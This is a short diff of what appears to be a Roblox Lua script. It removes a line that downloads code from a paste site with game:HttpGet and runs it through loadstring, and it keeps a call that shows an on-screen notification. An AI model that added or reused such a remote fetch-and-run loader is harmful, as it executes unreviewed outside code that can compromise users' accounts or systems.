@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://pastefy.app/A8Kfs9KV/raw", true))()
 local CoreGui = game:GetService("StarterGui")
 
 CoreGui:SetCore("SendNotification", {
